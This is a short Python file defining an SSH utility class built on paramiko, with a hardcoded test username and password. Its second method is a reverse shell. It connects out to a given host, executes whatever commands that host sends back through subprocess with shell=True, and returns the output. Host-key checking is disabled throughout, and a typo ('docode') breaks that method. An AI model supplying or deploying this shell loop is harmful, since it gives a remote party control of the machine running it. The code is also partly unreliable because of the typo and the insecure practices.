import paramiko
import os
import subprocess
import shlex


class SSHUtil():

    def __init__(self):
        self.basePath = os.path.dirname(__file__)

    def sshCommand1(self,ip,port,user,passwd,command):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        client.connect(ip,port=port,username=user,password=passwd)
        _,stdout,stderr=client.exec_command(command)
        output=stdout.readlines()
        if output:
            print('---Output---')
            for line in output:
                print(line.strip())

    def sshCommand2(self,ip,port,user,passwd,command):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        client.connect(ip,port=port,username=user,password=passwd)
        ssh_session = client.get_transport().open_session()
        if ssh_session.active:
            ssh_session.send(command)
            print(ssh_session.recv(1024).docode())
            while True:
                command = ssh_session.recv(1024)
                try:
                    cmd = command.decode()
                    if cmd == 'exit':
                        client.close()
                        break
                    cmd_output=subprocess.check_output(shlex.split(cmd),shell=True)
                    ssh_session.send(cmd_output or 'okay')
                except Exception as e:
                    ssh_session.send(str(e))
            client.close()
        return

if __name__ == '__main__':
    util = SSHUtil()
    util.sshCommand1('localhost',22,'hcz','huang056','id')